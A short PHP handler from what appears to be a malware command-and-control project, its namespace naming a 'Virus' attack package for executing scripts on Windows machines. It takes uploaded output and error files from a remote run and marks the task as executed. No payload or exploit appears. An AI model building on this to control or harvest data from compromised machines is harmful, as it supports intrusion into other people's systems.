<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript\ExecuteScript;

/** @var ExecuteScript $this */

$data = $this->requestData->fileCheck("dataFile");
$error = $this->requestData->fileCheck("errFile");

$this->setData($data);
$this->setError($error);
$this->setExecuted();
$this->saveState();